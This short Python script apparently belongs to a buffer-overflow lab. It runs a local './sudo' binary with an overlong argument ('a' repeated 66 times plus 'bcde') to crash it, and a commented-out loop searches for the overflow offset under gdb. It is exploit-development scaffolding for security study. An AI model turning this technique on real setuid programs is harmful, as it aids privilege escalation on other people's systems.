import os, sys


PATH_TO_SUDO = './sudo'


def get_crash_arg():
    return 'a'*66 + 'bcde'


def main(argv):
	# for i in range (65, 80):
	# 	pid = os.fork()	
	# 	if(pid == 0):
	# 		print('putting ' + str(i) + ' a\'s:\n')
	# 		os.execl('/usr/bin/gdb', '/usr/bin/gdb', '-ex=r', '--args', './sudo', get_crash_arg(i))
	# 	else:
	# 		pids = (os.getpid(), pid)
	# 		reply = input("q for quit / c for new fork")
	# 		if reply == 'c':
	# 			continue
	# 		else:
	# 			break
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_crash_arg());


if __name__ == '__main__':
    main(sys.argv)
